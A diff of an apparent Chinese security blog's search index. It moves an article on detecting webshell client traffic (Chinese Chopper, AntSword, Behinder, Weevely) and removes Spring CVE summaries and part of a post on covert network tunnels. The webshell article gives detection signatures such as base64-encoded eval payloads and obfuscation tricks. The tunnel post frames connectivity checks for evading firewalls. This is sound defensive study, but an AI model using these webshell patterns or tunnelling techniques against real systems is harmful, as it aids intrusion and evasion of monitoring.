-<h2 id="Spring-Web-Flow框架远程代码执行-CVE-2017-4971"><a href="#Spring-Web-Flow框架远程代码执行-CVE-2017-4971" class="headerlink" title="Spring Web Flow框架远程代码执行(CVE-2017-4971)"></a>Spring Web Flow框架远程代码执行(CVE-2017-4971)</h2><h3 id="漏洞简介-1"><a href="#漏洞简介-1" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>Spring Web Flow是Spring的一个子项目，主要目的是解决跨越多个请求的、用户与服务器之间的、有状态交互问题，提供了描述业务流程的抽象能力。</p>
-<p>Spring WebFlow 是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其 2.4.x 版本中，如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。</p>
-<h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Spring WebFlow 2.4.0 - 2.4.4</span><br></pre></td></tr></table></figure>
-
-<h3 id="触发条件"><a href="#触发条件" class="headerlink" title="触发条件"></a>触发条件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MvcViewFactoryCreator对象的useSpringBeanBinding参数需要设置为false（默认值）</span><br><span class="line">flow view对象中设置BinderConfiguration对象为空</span><br></pre></td></tr></table></figure>
-
-<h2 id="Spring-Data-Rest远程命令执行命令-CVE-2017-8046"><a href="#Spring-Data-Rest远程命令执行命令-CVE-2017-8046" class="headerlink" title="Spring Data Rest远程命令执行命令(CVE-2017-8046)"></a>Spring Data Rest远程命令执行命令(CVE-2017-8046)</h2><h3 id="漏洞简介-2"><a href="#漏洞简介-2" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>Spring-data-rest服务器在处理PATCH请求时，攻击者可以构造恶意的PATCH请求并发送给spring-date-rest服务器，通过构造好的JSON数据来执行任意Java代码。</p>
-<h3 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Spring Data REST versions &lt; 2.5.12, 2.6.7, 3.0 RC3</span><br><span class="line">Spring Boot version &lt; 2.0.0M4</span><br><span class="line">Spring Data release trains &lt; Kay-RC3</span><br></pre></td></tr></table></figure>
-
-<h2 id="Spring-Messaging远程命令执行突破-CVE-2018-1270"><a href="#Spring-Messaging远程命令执行突破-CVE-2018-1270" class="headerlink" title="Spring Messaging远程命令执行突破(CVE-2018-1270)"></a>Spring Messaging远程命令执行突破(CVE-2018-1270)</h2><h3 id="漏洞简介-3"><a href="#漏洞简介-3" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>spring  messaging为spring框架提供消息支持，其上层协议是STOMP，底层通信基于SockJS，STOMP消息代理在处理客户端消息时存在SpEL表达式注入漏洞，在spring  messaging中，其允许客户端订阅消息，并使用selector过滤消息。selector用SpEL表达式编写，并使用StandardEvaluationContext解析，造成命令执行漏洞。</p>
-<h3 id="影响版本-3"><a href="#影响版本-3" class="headerlink" title="影响版本"></a>影响版本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Spring Framework 5.0 - 5.0.5</span><br><span class="line">Spring Framework 4.3 - 4.3.15</span><br><span class="line">已不支持的旧版本仍然受影响</span><br></pre></td></tr></table></figure>
-
-<h2 id="Spring-Data-Commons远程命令执行漏洞-CVE-2018-1273"><a href="#Spring-Data-Commons远程命令执行漏洞-CVE-2018-1273" class="headerlink" title="Spring Data Commons远程命令执行漏洞(CVE-2018-1273)"></a>Spring Data Commons远程命令执行漏洞(CVE-2018-1273)</h2><h3 id="漏洞简介-4"><a href="#漏洞简介-4" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，Spring Data Commons是Spring  Data下所有子项目共享的基础框架。Spring Data Commons  在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。</p>
-<h3 id="影响版本-4"><a href="#影响版本-4" class="headerlink" title="影响版本"></a>影响版本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Spring Data Commons 1.13 – 1.13.10 (Ingalls SR10)</span><br><span class="line">Spring Data REST 2.6 – 2.6.10(Ingalls SR10)</span><br><span class="line">Spring Data Commons 2.0 – 2.0.5 (Kay SR5)</span><br><span class="line">Spring Data REST 3.0 – 3.0.5(Kay SR5)</span><br><span class="line">官方已经不支持的旧版本</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>java框架漏洞</category>
-      </categories>
-      <tags>
-        <tag>Spring框架漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -835,6 +835,53 @@
       </tags>
   </entry>
   <entry>
+    <title>常见webshell客户端的流量特征及检测思路</title>
+    <url>/2022/03/01/%E5%B8%B8%E8%A7%81webshell%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%8F%8A%E6%A3%80%E6%B5%8B%E6%80%9D%E8%B7%AF/</url>
+    <content><![CDATA[<span id="more"></span>
+
+<h1 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h1><p>主流为11、14、16版，11到14功能性增强，14到16隐秘性增强。它支持PHP、JSP、ASP三种webshell的链接。</p>
+<h2 id="11和14版本的流量特征"><a href="#11和14版本的流量特征" class="headerlink" title="11和14版本的流量特征"></a>11和14版本的流量特征</h2><h3 id="php类的webshell流量特征"><a href="#php类的webshell流量特征" class="headerlink" title="php类的webshell流量特征"></a>php类的webshell流量特征</h3><p>主要特征在body当中，将其中的流量解码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.&quot;eval&quot;，eval函数用于执行传递攻击的payload</span><br><span class="line">2.(base64_decode($_POST[z0]))，将攻击payload进行base64解码，菜刀默认将攻击荷载base64编码，避免被检测</span><br><span class="line">3.&amp;z0=QGluaV9zZXQ...，传递攻击payload，参数z0对应$_POST[z0]接收到的数据，该参数值使用base64编码的，所以使用base64解码可以看到攻击明文。</span><br><span class="line"></span><br><span class="line">注意：</span><br><span class="line">1.少数地方eval函数被assert方法替代</span><br><span class="line">2.$_POST也会被$_GET、$_REQUEST替代</span><br><span class="line">3.z0是菜刀默认的参数，这个地方也有可能被修改为其他参数名。</span><br></pre></td></tr></table></figure>
+
+<h3 id="jsp类的webshell流量特征"><a href="#jsp类的webshell流量特征" class="headerlink" title="jsp类的webshell流量特征"></a>jsp类的webshell流量特征</h3><p>该流量是WebShell链接流量的第一段链接流量，其中特征主要在i&#x3D;A&amp;z0&#x3D;GB2312，菜刀链接JSP木马时，第一个参数定义操作，其中参数值为A-Q，如i&#x3D;A，第二个参数指定编码，其参数值为编码，如z0&#x3D;GB2312，有时候z0后面还会接着又z1&#x3D;参数用来加入攻击载荷。</p>
+<p>注：其中参数名i、z0、z1这种参数名是会变的，但是其参数值以及这种形式是不会变得，最主要就是第一个参数值在A-Q，这种是不变的。</p>
+<h3 id="asp类的webshell流量特征"><a href="#asp类的webshell流量特征" class="headerlink" title="asp类的webshell流量特征"></a>asp类的webshell流量特征</h3><p>其中body流量进行URL解码后其特征点有如下三个</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.“Execute”，此函数执行传递的攻击payload，等同于php的eval</span><br><span class="line">2.OnError ResumeNext，大部分asp客户端中必有的流量，不管前边有任何错误，继续执行</span><br><span class="line">3.Response.Write和Response.End必有，完善整个操作</span><br><span class="line"></span><br><span class="line">注意：</span><br><span class="line">OnError Resume Next这个特征在大部分流量中存在，极少数没有。</span><br></pre></td></tr></table></figure>
+
+<h2 id="16版的流量特征"><a href="#16版的流量特征" class="headerlink" title="16版的流量特征"></a>16版的流量特征</h2><h3 id="php类的webshell流量特征-1"><a href="#php类的webshell流量特征-1" class="headerlink" title="php类的webshell流量特征"></a>php类的webshell流量特征</h3><p>其中特征主要在body中，将body中部分如下：这个版本中流量最大的改变就是将特征进行打断混淆，这也给我们识别特征提供一种思路。其中特征点有如下三部分</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.“&quot;Ba&quot;.&quot;SE6&quot;.&quot;4_dEc&quot;.&quot;OdE”，这部分是将base64解码打断使用.来连接。</span><br><span class="line">2.@ev&quot;.&quot;al，这部分也是将@eval这部分进行打断连接，可以识别这段代码即可。</span><br><span class="line">3.QGluaV9zZXQoImRpc3BsYXlf...，该部分是传递攻击payload，payload依旧使用Base64编码的，所以可以利用base64解码可以看到攻击明文来识别。</span><br><span class="line"></span><br><span class="line">注意：有少数时候eval方法会被assert方法替代。</span><br></pre></td></tr></table></figure>
+
+<h3 id="jsp类的webshell流量特征-1"><a href="#jsp类的webshell流量特征-1" class="headerlink" title="jsp类的webshell流量特征"></a>jsp类的webshell流量特征</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">所以分析如上：该流量是WebShell链接流量的第一段链接流量，其中特征主要在i=A&amp;z0=GB2312，菜刀链接JSP木马时，第一个参数定义操作，其中参数值为A-Q，如i=A，第二个参数指定编码，其参数值为编码，如z0=GB2312，有时候z0后面还会接着又z1=、z2=参数用来加入攻击载荷。</span><br><span class="line">注：其中参数名i、z0、z1这种参数名是会变的，但是其参数值以及这种形式是不会变得，最主要就是第一个参数值在A-Q，这种是不变的。</span><br></pre></td></tr></table></figure>
+
+<h3 id="asp类的webshell流量特征-1"><a href="#asp类的webshell流量特征-1" class="headerlink" title="asp类的webshell流量特征"></a>asp类的webshell流量特征</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">其中body流量为：</span><br><span class="line">2016版本流量这链接流量最大的变化在于body中部分字符被unicode编码替换混淆，所以这种特征需要提取出一种形式来，匹配这个混淆特征，比如“字符+%u0000+字符+%u0000”这种形式来判断该流量。</span><br><span class="line">或者直接将这部分代码直接进行unicode解码，可以获取到如2011或2014版本的asp所示的流量。可以根据上一段特征来进行判断。</span><br><span class="line">这种流量主要识别这几部分特征，在正常流量中基本没有。</span><br></pre></td></tr></table></figure>
+
+<h1 id="中国蚁剑"><a href="#中国蚁剑" class="headerlink" title="中国蚁剑"></a>中国蚁剑</h1><p>大部分代码来源于菜刀，但是蚁剑扩充性好，可以对进行加密、混淆等绕过处理。蚁剑默认支持ASP以及PHP的webshell链接。</p>
+<h2 id="PHP类链接特征"><a href="#PHP类链接特征" class="headerlink" title="PHP类链接特征"></a>PHP类链接特征</h2><p>其中body流量进行url解码后为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">最明显的为@ini_set(&quot;display_errors&quot;,&quot;0&quot;);这段代码是基本所有webshell客户端连接php类webshell都有的一种代码，有的客户端会加密、编码。蚁剑是明文，好发现。</span><br></pre></td></tr></table></figure>
+
+<h2 id="ASP类链接特征"><a href="#ASP类链接特征" class="headerlink" title="ASP类链接特征"></a>ASP类链接特征</h2><p>其中body流量进行url解码后为；</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">与菜刀很像。如OnError、ResumeNext、Response.End、Response.Write其中execute在蚁剑中被打断混淆了，变成了拼接形式Ex&quot;&amp;cHr(101)&amp;&quot;cute,同时该流量也用了eval参数。</span><br></pre></td></tr></table></figure>
+
+<h2 id="蚁剑绕过流量特征"><a href="#蚁剑绕过流量特征" class="headerlink" title="蚁剑绕过流量特征"></a>蚁剑绕过流量特征</h2><p>蚁剑包含了很多加密、绕过插件，所以导致很多流量被加密后无法识别，但是还有一个明显的特征，即参数名大多数以”_0x……”这种形式。所以以这种形式开头的参数名，后面为加密数据的数据包也是特征。</p>
+<h1 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h1><p>流量进行了加密，且加密密钥使用者自己来设定，但是该拦截器对webshell的需求比较高，无法连接一句话木马，综上，该客户端的流量无法检测。</p>
+<p>功能介绍</p>
+<p><a href="https://xz.aliyun.com/t/2799">《利用动态二进制加密实现新型一句话木马之客户端篇》</a></p>
+<p>工作原理</p>
+<p><a href="https://xz.aliyun.com/t/2744">《利用动态二进制加密实现新型一句话木马之java篇》</a></p>
+<p><a href="https://xz.aliyun.com/t/2758">《利用动态二进制加密实现新型一句话木马之.NET篇》</a></p>
+<p><a href="https://xz.aliyun.com/t/2774">《利用动态二进制加密实现新型一句话木马之PHP篇》</a></p>
+<h1 id="Cknife"><a href="#Cknife" class="headerlink" title="Cknife"></a>Cknife</h1><p>特征就是在body部分的参数值均为base64编码，将该部分进行base64解码后，其流量特征同中国菜刀一致</p>
+<h1 id="Weevely"><a href="#Weevely" class="headerlink" title="Weevely"></a>Weevely</h1><p>Weevely是kail中自带的一款功能强大的WebShell客户端，该链接器首先自己生成webshell，在将该webshell上传至目的服务器后，通过Weevely进行链接，该链接流量属于加密流量，但是在该流量中还可以发现特征，进行区分。</p>
+<p>该流量中的攻击载荷存在于Referer中，其中Referer中的路径中php的查询参数有以下参数名或值，即sa&#x3D;、source&#x3D;web、cd&#x3D;数字、url&#x3D;、ei&#x3D;，即可确定该流量为客户端流量。</p>
+]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>webshell的流量特征</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>权限提升</title>
     <url>/2022/04/03/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</url>
     <content><![CDATA[<span id="more"></span>
@@ -1058,173 +1105,6 @@
       </tags>
   </entry>
   <entry>
-    <title>常见webshell客户端的流量特征及检测思路</title>
-    <url>/2022/03/01/%E5%B8%B8%E8%A7%81webshell%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%8F%8A%E6%A3%80%E6%B5%8B%E6%80%9D%E8%B7%AF/</url>
-    <content><![CDATA[<span id="more"></span>
-
-<h1 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h1><p>主流为11、14、16版，11到14功能性增强，14到16隐秘性增强。它支持PHP、JSP、ASP三种webshell的链接。</p>
-<h2 id="11和14版本的流量特征"><a href="#11和14版本的流量特征" class="headerlink" title="11和14版本的流量特征"></a>11和14版本的流量特征</h2><h3 id="php类的webshell流量特征"><a href="#php类的webshell流量特征" class="headerlink" title="php类的webshell流量特征"></a>php类的webshell流量特征</h3><p>主要特征在body当中，将其中的流量解码如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.&quot;eval&quot;，eval函数用于执行传递攻击的payload</span><br><span class="line">2.(base64_decode($_POST[z0]))，将攻击payload进行base64解码，菜刀默认将攻击荷载base64编码，避免被检测</span><br><span class="line">3.&amp;z0=QGluaV9zZXQ...，传递攻击payload，参数z0对应$_POST[z0]接收到的数据，该参数值使用base64编码的，所以使用base64解码可以看到攻击明文。</span><br><span class="line"></span><br><span class="line">注意：</span><br><span class="line">1.少数地方eval函数被assert方法替代</span><br><span class="line">2.$_POST也会被$_GET、$_REQUEST替代</span><br><span class="line">3.z0是菜刀默认的参数，这个地方也有可能被修改为其他参数名。</span><br></pre></td></tr></table></figure>
-
-<h3 id="jsp类的webshell流量特征"><a href="#jsp类的webshell流量特征" class="headerlink" title="jsp类的webshell流量特征"></a>jsp类的webshell流量特征</h3><p>该流量是WebShell链接流量的第一段链接流量，其中特征主要在i&#x3D;A&amp;z0&#x3D;GB2312，菜刀链接JSP木马时，第一个参数定义操作，其中参数值为A-Q，如i&#x3D;A，第二个参数指定编码，其参数值为编码，如z0&#x3D;GB2312，有时候z0后面还会接着又z1&#x3D;参数用来加入攻击载荷。</p>
-<p>注：其中参数名i、z0、z1这种参数名是会变的，但是其参数值以及这种形式是不会变得，最主要就是第一个参数值在A-Q，这种是不变的。</p>
-<h3 id="asp类的webshell流量特征"><a href="#asp类的webshell流量特征" class="headerlink" title="asp类的webshell流量特征"></a>asp类的webshell流量特征</h3><p>其中body流量进行URL解码后其特征点有如下三个</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.“Execute”，此函数执行传递的攻击payload，等同于php的eval</span><br><span class="line">2.OnError ResumeNext，大部分asp客户端中必有的流量，不管前边有任何错误，继续执行</span><br><span class="line">3.Response.Write和Response.End必有，完善整个操作</span><br><span class="line"></span><br><span class="line">注意：</span><br><span class="line">OnError Resume Next这个特征在大部分流量中存在，极少数没有。</span><br></pre></td></tr></table></figure>
-
-<h2 id="16版的流量特征"><a href="#16版的流量特征" class="headerlink" title="16版的流量特征"></a>16版的流量特征</h2><h3 id="php类的webshell流量特征-1"><a href="#php类的webshell流量特征-1" class="headerlink" title="php类的webshell流量特征"></a>php类的webshell流量特征</h3><p>其中特征主要在body中，将body中部分如下：这个版本中流量最大的改变就是将特征进行打断混淆，这也给我们识别特征提供一种思路。其中特征点有如下三部分</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.“&quot;Ba&quot;.&quot;SE6&quot;.&quot;4_dEc&quot;.&quot;OdE”，这部分是将base64解码打断使用.来连接。</span><br><span class="line">2.@ev&quot;.&quot;al，这部分也是将@eval这部分进行打断连接，可以识别这段代码即可。</span><br><span class="line">3.QGluaV9zZXQoImRpc3BsYXlf...，该部分是传递攻击payload，payload依旧使用Base64编码的，所以可以利用base64解码可以看到攻击明文来识别。</span><br><span class="line"></span><br><span class="line">注意：有少数时候eval方法会被assert方法替代。</span><br></pre></td></tr></table></figure>
-
-<h3 id="jsp类的webshell流量特征-1"><a href="#jsp类的webshell流量特征-1" class="headerlink" title="jsp类的webshell流量特征"></a>jsp类的webshell流量特征</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">所以分析如上：该流量是WebShell链接流量的第一段链接流量，其中特征主要在i=A&amp;z0=GB2312，菜刀链接JSP木马时，第一个参数定义操作，其中参数值为A-Q，如i=A，第二个参数指定编码，其参数值为编码，如z0=GB2312，有时候z0后面还会接着又z1=、z2=参数用来加入攻击载荷。</span><br><span class="line">注：其中参数名i、z0、z1这种参数名是会变的，但是其参数值以及这种形式是不会变得，最主要就是第一个参数值在A-Q，这种是不变的。</span><br></pre></td></tr></table></figure>
-
-<h3 id="asp类的webshell流量特征-1"><a href="#asp类的webshell流量特征-1" class="headerlink" title="asp类的webshell流量特征"></a>asp类的webshell流量特征</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">其中body流量为：</span><br><span class="line">2016版本流量这链接流量最大的变化在于body中部分字符被unicode编码替换混淆，所以这种特征需要提取出一种形式来，匹配这个混淆特征，比如“字符+%u0000+字符+%u0000”这种形式来判断该流量。</span><br><span class="line">或者直接将这部分代码直接进行unicode解码，可以获取到如2011或2014版本的asp所示的流量。可以根据上一段特征来进行判断。</span><br><span class="line">这种流量主要识别这几部分特征，在正常流量中基本没有。</span><br></pre></td></tr></table></figure>
-
-<h1 id="中国蚁剑"><a href="#中国蚁剑" class="headerlink" title="中国蚁剑"></a>中国蚁剑</h1><p>大部分代码来源于菜刀，但是蚁剑扩充性好，可以对进行加密、混淆等绕过处理。蚁剑默认支持ASP以及PHP的webshell链接。</p>
-<h2 id="PHP类链接特征"><a href="#PHP类链接特征" class="headerlink" title="PHP类链接特征"></a>PHP类链接特征</h2><p>其中body流量进行url解码后为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">最明显的为@ini_set(&quot;display_errors&quot;,&quot;0&quot;);这段代码是基本所有webshell客户端连接php类webshell都有的一种代码，有的客户端会加密、编码。蚁剑是明文，好发现。</span><br></pre></td></tr></table></figure>
-
-<h2 id="ASP类链接特征"><a href="#ASP类链接特征" class="headerlink" title="ASP类链接特征"></a>ASP类链接特征</h2><p>其中body流量进行url解码后为；</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">与菜刀很像。如OnError、ResumeNext、Response.End、Response.Write其中execute在蚁剑中被打断混淆了，变成了拼接形式Ex&quot;&amp;cHr(101)&amp;&quot;cute,同时该流量也用了eval参数。</span><br></pre></td></tr></table></figure>
-
-<h2 id="蚁剑绕过流量特征"><a href="#蚁剑绕过流量特征" class="headerlink" title="蚁剑绕过流量特征"></a>蚁剑绕过流量特征</h2><p>蚁剑包含了很多加密、绕过插件，所以导致很多流量被加密后无法识别，但是还有一个明显的特征，即参数名大多数以”_0x……”这种形式。所以以这种形式开头的参数名，后面为加密数据的数据包也是特征。</p>
-<h1 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h1><p>流量进行了加密，且加密密钥使用者自己来设定，但是该拦截器对webshell的需求比较高，无法连接一句话木马，综上，该客户端的流量无法检测。</p>
-<p>功能介绍</p>
-<p><a href="https://xz.aliyun.com/t/2799">《利用动态二进制加密实现新型一句话木马之客户端篇》</a></p>
-<p>工作原理</p>
-<p><a href="https://xz.aliyun.com/t/2744">《利用动态二进制加密实现新型一句话木马之java篇》</a></p>
-<p><a href="https://xz.aliyun.com/t/2758">《利用动态二进制加密实现新型一句话木马之.NET篇》</a></p>
-<p><a href="https://xz.aliyun.com/t/2774">《利用动态二进制加密实现新型一句话木马之PHP篇》</a></p>
-<h1 id="Cknife"><a href="#Cknife" class="headerlink" title="Cknife"></a>Cknife</h1><p>特征就是在body部分的参数值均为base64编码，将该部分进行base64解码后，其流量特征同中国菜刀一致</p>
-<h1 id="Weevely"><a href="#Weevely" class="headerlink" title="Weevely"></a>Weevely</h1><p>Weevely是kail中自带的一款功能强大的WebShell客户端，该链接器首先自己生成webshell，在将该webshell上传至目的服务器后，通过Weevely进行链接，该链接流量属于加密流量，但是在该流量中还可以发现特征，进行区分。</p>
-<p>该流量中的攻击载荷存在于Referer中，其中Referer中的路径中php的查询参数有以下参数名或值，即sa&#x3D;、source&#x3D;web、cd&#x3D;数字、url&#x3D;、ei&#x3D;，即可确定该流量为客户端流量。</p>
-]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>webshell的流量特征</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>隐藏通信隧道</title>
-    <url>/2022/02/17/%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93/</url>
-    <content><![CDATA[<span id="more"></span>
-
-<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>一般的网络通信，两个机器先建立TCP连接，然后正常数据通信，知道ip地址后可直接发送报文，不知道可以用域名解析，但是在实际中，可通过边界设备、软硬waf、ids检查阻断连接。</p>
-<p>隧道就是绕过端口屏蔽的通信方式，waf两端数据包通过waf允许的数据包类型或端口进行封装，穿过防火墙，进行通信。当封装的数据包到达目的地，进行还原，并将其还原后的数据包发送到相应的服务器上。</p>
-<p>CS、MSF无法上线，数据传输不稳定无回显、出口数据被监控、网络通信存在问题。</p>
-<p>常用隧道：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">网络层：IPv6、ICMP、GRE</span><br><span class="line">传输层：TCP、UDP、常规端口</span><br><span class="line">应用层：SSH、HTTP、HTTPS、DNS</span><br></pre></td></tr></table></figure>
-
-<h2 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h2><p>执行ping</p>
-<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402090732542.png" alt="image-20220402090732542"></p>
-<h2 id="TCP协议"><a href="#TCP协议" class="headerlink" title="TCP协议"></a>TCP协议</h2><p>netcat（nc）瑞士军刀，工具，通过使用TCP或者UDP协议的网络连接读写数据。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402091737750.png" alt="image-20220402091737750"></p>
-<h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><p>curl是一个利用url规则在命令行下工作的综合文件传输工具，支持文件上传下载。curl不仅支持HTTP、HTTPS、FTP等多种协议，还支持POST、Cookie、认证、从指定偏移处下载部分文件、用户代理字符串、限速、文件大小、进度条等特征。Linux操作系统自带curl命令。在Windows操作系统中,需要下载并安装curl命令</p>
-<p>在使用curl时,需要执行“curl&lt; IP地址:端口号 &gt;”命令。如果远程主机开启了相应的端口，会输出相应的端口信息，如图3-3所示。如果远程主机没有开通相应的端口，则没有任何提示。按“Ctrl+C”键即可断开连接。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402092506527.png" alt="image-20220402092506527"></p>
-<h2 id="DNS协议"><a href="#DNS协议" class="headerlink" title="DNS协议"></a>DNS协议</h2><p>在进行 DNS连通性检测时，常用的命令为nslookup和 dig。<br>nslookup是 Windows操作系统自带的 DNS 探测命令，其用法如下所示。在没有指定 vps-ip时，nslookup 会从系统网络的TCP&#x2F;IP属性中读取 DNS服务器的地址。具体的使用方法是:打开Windows操作系统的命令行环境,输人“nslookup”命令,按“回车”键,然后输入“help”命令</p>
-<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402092938431.png" alt="image-20220402092938431"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup www.baidu.com vps-ip</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402093948502.png" alt="image-20220402093948502"></p>
-<p>dig是 Linux默认自带的 DNS 探测命令，其用法如下所示。在没有指定vps-ip时,dig会到<br>&#x2F;etc&#x2F;resolv.conf文件中读取系统配置的 DNS服务器的地址。如果vps-ip为192.168.43.1，将解析百度网的IP地址，说明目前DNS协议是连通的,如图3-5所示。具体的使用方法，可在 Linux命令行环境中输入“dig -h”命令获取。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dig @vps-ip www.baidu.com（解析结果）</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220402093550235.png" alt="image-20220402093550235"></p>
-<p>还有一种情况是流量不能直接流出，需要在内网中设置代理服务器，常见于通过企业办公网段上网的场景。常用的判断方法如下。<br>    查看网络连接，判断是否存在与其他机器的8080（不绝对）等端口的连接（可以尝试运行”ping -n 1 -a ip”命令)。<br>②查看内网中是否有主机名类似于“proxy”的机器。</p>
-<p>③查看IE浏览器的直接代理。</p>
-<p>④根据pac文件的路径（可能是本地路径，也可能是远程路径)，将其下载下来并查看。</p>
-<p>⑤执行如下命令，利用curl工具进行确认。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl www.baidu. com//不通</span><br><span class="line">curl -x proxy-ip:port www.baidu . com//通</span><br></pre></td></tr></table></figure>
-
-<h1 id="网络层隧道技术"><a href="#网络层隧道技术" class="headerlink" title="网络层隧道技术"></a>网络层隧道技术</h1><p>在网络层中，两个常用的 隧道协议是IPv6和ICMP，下面进行介绍</p>
-<h2 id="IPv6隧道"><a href="#IPv6隧道" class="headerlink" title="IPv6隧道"></a>IPv6隧道</h2><h3 id="技术简介"><a href="#技术简介" class="headerlink" title="技术简介"></a>技术简介</h3><p>“IPv6”是“Internet Protocol Version 6”的缩写，也被称为下一代互联网协议。它是由IETF设计用来代替现行的IPv4协议的一种新的IP协议。IPv4协议已经使用了20多年，目前面临着地址匮乏等一系列问题，而IPv6则能从根本上解决这些问题。现在，由于IPv4资源几乎耗尽，IPv6开始进入过渡阶段。</p>
-<p>IPv6隧道技术是指通过IPv4隧道传送 IPv6 数据报文的技术。为了在IPv4海洋中传递IPv6信息，可以将IPv4作为隧道载体,将IPv6报文整体封装在IPv4数据报文中,使IPv6报文能够穿过IPv4海洋,到达另一个IPv6小岛。<br>打个比方，快递公司收取包裹之后，发现自己在目的地没有站点，无法投送，则将此包裹转交给能到达目的地的快递公司（例如中国邮政）来投递。也就是说，将快递公司已经封装好的包裹（类似于IPv6报文)，用中国邮政的包装箱再封装一次（类似于封装成IPv4报文)，以便这个包裹在中国邮政的系统（IPv4海洋）中被正常投递。</p>
-<p>攻击者有时会通过恶意软件来配置允许进行IPv6通信的设备，以避开防火墙和入侵检测系统。有一点需要指出:即使设备支持IPv6，也可能无法正确分析封装了IPv6报文的IPv4数据包。<br>配置隧道和自动隧道的主要区别是:只有在执行隧道功能的节点的IPv6地址是 IPv4兼容地址时，自动隧道才是可行的。在为执行隧道功能的节点分配IP地址时,如果采用的是自动隧道方法，就不需要进行配置。<br>配置隧道方法则要求隧道末端节点使用其他机制来获得其IPv4地址，例如采用DHCP、人工配置或其他 IPv4的配置机制。<br>支持IPv6的隧道工具有socat、6tunnel、nt6tunnel 等。</p>
-<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>针对IPv6隧道攻击，最好的防御方法是:了解IPv6的具体漏洞，结合其他协议，通过防火墙和深度防御系统过滤IPv6通信,提高主机和应用程序的安全性。</p>
-<h2 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a>ICMP隧道</h2><p>ICMP隧道简单、实用,是一个比较特殊的协议。在一般的通信协议里,如果两台设备要进行通信，肯定需要开放端口，而在ICMP协议下就不需要。最常见的ICMP消息为ping 命令的回复，攻击者可以利用命令行得到比回复更多的ICMP请求。在通常情况下，每个 ping命令都有相对应的回复与请求。</p>
